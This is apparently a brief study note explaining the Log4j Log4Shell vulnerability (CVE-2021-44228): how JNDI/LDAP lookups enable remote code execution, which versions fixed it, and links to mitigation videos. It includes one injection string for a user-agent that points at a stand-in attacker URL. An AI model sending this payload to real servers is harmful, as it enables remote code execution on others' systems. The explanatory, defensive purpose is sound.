                                                                   Log4j zero-day vulnerability
                                                                 *********************************
   https://www.prplbx.com/resources/blog/log4j/

   
   The security risk with Log4j has been termed as CVE-2021-44228 or Log4Shell or LogJam or Log4Shell or Log4j RCE(Remote Code Execution).
   This vulnerability was discovered by Chen Zhaojun of the Alibaba Cloud Security Team on December 9th, 2021. 
   As per the Common Vulnerability Scoring System or CVSS, Apache team ranked the vulnerability as 10.
   
   This vulnerability allows unauthenticated RCE(Remote Code Execution) with JNDI & LDAP in Log4j. 
   Attackers can take advantage of it by modifying their browser's user-agent string to ${jndi:ldap://[attacker_URL]} format.
   An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. 
   JNDI allows programmers to look up items using a variety of services and protocols, including LDAP, DNS, Java Remote Method Invocation (RMI), and others.
   
   From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 , this functionality has been completely removed. 
  
  
  
  CVE - Common Vulnerabilities and Exposures. CVE provides a free dictionary for organizations to improve their cyber security.
  JNDI - Java Naming and Directory Interface.
  LDAP - Lightweight Directory Access Protocol.
  
  Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
  
  What is this & way to mitigate(reducing to make less harm)
   https://www.youtube.com/watch?v=gkVq4kLULOA&t=20s
   https://www.youtube.com/watch?v=EyewKNb192c
   
  Practical example in spring project
  https://www.youtube.com/watch?v=4o6dyoHYRWE&t=301s
  
